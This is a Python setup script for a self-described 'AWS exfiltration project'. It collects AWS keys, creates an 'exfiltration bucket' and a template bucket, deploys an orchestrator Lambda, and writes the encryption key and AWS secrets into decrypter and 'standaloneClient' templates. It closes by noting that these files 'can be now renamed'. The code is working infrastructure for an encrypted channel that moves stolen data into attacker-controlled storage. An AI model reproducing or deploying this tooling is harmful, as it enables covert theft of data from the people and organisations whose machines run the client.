import boto3
from cryptography.fernet import Fernet
import json
from botocore.exceptions import ClientError
from zipfile import ZipFile



print('Welcome to AWS exfiltration project!')
clientEnteredData = True

while clientEnteredData:
	aws_access_key = input("Enter AWS access key: ")
	aws_secret_access_key = input("Enter AWS secret access key: ")
	region_name = input("Enter preferred region: ")
	fernet_key = Fernet.generate_key()
	orchestrator_name = input("Enter a cool name for your orchestrator function: ")
	exfiltration_bucket_name = input("Enter a name for your exfiltration bucket, remember names must be lowecase and unique: ")
	template_bucket_name = input("Enter a name for your template bucket, remember names must be lowecase and unique: ")
	iam_role_arn = input("Enter the iam_role arn: ")
	print('-------------------------------------------------')
	print('Info entered was the following:')
	print('aws_access_key: ' + aws_access_key)
	print('aws_secret_access_key: ' + aws_secret_access_key)
	print('region_name: ' + region_name)
	print('exfiltration_bucket_name: ' + exfiltration_bucket_name)
	print('template_bucket_name: ' + template_bucket_name)
	print('iam_role_arn: ' + iam_role_arn)
	print('-------------------------------------------------')
	client_data = input('Is this information correct? [y/n]: ')
	if client_data == 'y':
		clientEnteredData = False

	print('Your encryption/decryption key is: ' + fernet_key.decode() + '\nRemember it just in case!')

print('Connecting to aws...')

session = boto3.session.Session(
			aws_access_key_id = aws_access_key, 
			aws_secret_access_key = aws_secret_access_key,
			region_name = region_name
			)
print('...Connected!')
print('-------------------------------------------------')

s3_client = session.client('s3')

exfiltrationBucketInCreation = True
while exfiltrationBucketInCreation:
	print('Creating exfiltration bucket...')
	try:
		s3_client.create_bucket(
				ACL = 'private',
				Bucket = exfiltration_bucket_name,
				CreateBucketConfiguration = {
						'LocationConstraint': region_name
					}
				)
		exfiltrationBucketInCreation = False
		print('...Exfiltration bucket created!')
	except ClientError:
		print('That bucket name already exists!, please select another name')
		exfiltration_bucket_name = input("Enter a name for your exfiltration bucket, remember names must be lowecase and unique: ")


templateBucketInCreation = True
while templateBucketInCreation:
	print('Creating template bucket...')
	try:
		s3_client.create_bucket(
				ACL = 'private',
				Bucket = template_bucket_name,
				CreateBucketConfiguration = {
						'LocationConstraint': region_name
					}
				)
		templateBucketInCreation = False
		print('...Template bucket created!')
	except ClientError:
		print('That bucket name already exists!, please select another name')
		template_bucket_name = input("Enter a name for your template bucket, remember names must be lowecase and unique: ")

print('-------------------------------------------------')

s3_resource = session.resource('s3')

print("Modifying template files...")
print("Sample function setup...")
#######Sample function setup
#------------------Modifying data------------------
with open('sampleFunction_template.py','r') as f:
	lines = f.readlines()
	#print(lines)
with open('sampleFunction_template.py','w') as f:
	lines.insert(3, str("exfiltration_bucket_name = " + "'" + exfiltration_bucket_name + "'\n"))
	f.write("".join(lines))
#------------------Compressing------------------
zipObj = ZipFile('sampleFunction.zip', 'w')
zipObj.write('sampleFunction_template.py')
zipObj.close()
#------------------Upload function to s3 bucket--------
s3_resource.meta.client.upload_file('sampleFunction.zip', template_bucket_name, 'sampleFunction.zip')

#######Orchestrator setup
print("Orchestrator setup...")
#------------------Modifying data------------------
with open('orchestrator_template.py','r') as f:
	lines = f.readlines()
	#print(lines)
with open('orchestrator_template.py','w') as f:
	lines.insert(6, str("template_bucket_name = " + "'" + template_bucket_name + "'\n"))
	lines.insert(7, str("compressed_function_name = " + "'" + "sampleFunction.zip" + "'\n"))
	lines.insert(8, str("lambda_s3_iam_role = " + "'" + iam_role_arn + "'\n"))
	f.write("".join(lines))
#-----------------Compressing----------------
zipObj = ZipFile('orchestrator_template.zip','w')
zipObj.write('orchestrator_template.py')
zipObj.close()
#-----------------Upload function to s3 bucket---------
s3_resource.meta.client.upload_file('orchestrator_template.zip', template_bucket_name, 'orchestrator_template.zip')
#-----------------Create lambda function based on previous template--------------
aws_lambda = session.client('lambda')
aws_lambda.create_function(
        FunctionName = orchestrator_name,
        Runtime = 'python3.7',
        Role = iam_role_arn,
        Handler = 'orchestrator_template.lambda_handler',
        Code = {
            'S3Bucket': template_bucket_name,
            'S3Key': 'orchestrator_template.zip'
            },
        Timeout = 300,
        MemorySize = 512 
        )


#######Decrypter setup
print("Decrypter setup...")
#------------------Modifying data------------------
with open('decrypter_template.py','r') as f:
	lines = f.readlines()
	#print(lines)
with open('decrypter_template.py','w') as f:
	lines.insert(9, str("key = " + "b" + "'" + fernet_key.decode() + "'\n"))
	lines.insert(10, str("aws_access_key_id = " + "'" + aws_access_key + "'\n"))
	lines.insert(11, str("aws_secret_access_key = " + "'" + aws_secret_access_key + "'\n"))
	lines.insert(12, str("region = " + "'" + region_name + "'\n"))
	lines.insert(13, str("exfiltration_bucket_name = " + "'" + exfiltration_bucket_name + "'\n"))
	f.write("".join(lines))


#######Standalone Client
print("Client setup...")
#------------------standaloneClient template------------------
with open('standaloneClient_template.py','r') as f:
	lines = f.readlines()
	#print(lines)
with open('standaloneClient_template.py','w') as f:
	lines.insert(9, str("key = " + "b" + "'" + fernet_key.decode() + "'\n"))
	lines.insert(10, str("aws_access_key_id = " + "'" + aws_access_key + "'\n"))
	lines.insert(11, str("aws_secret_access_key = " + "'" + aws_secret_access_key + "'\n"))
	lines.insert(12, str("region = " + "'" + region_name + "'\n"))
	lines.insert(13, str("orchestrator_function_name = " + "'" + orchestrator_name + "'\n"))
	f.write("".join(lines))



print("...All files modified!")
print('-------------------------------------------------')
print('Setup is complete! client and decrypter can be now renamed :)')





#with open('config.json','w') as f:
#	json.dump(config, f, ensure_ascii = False)
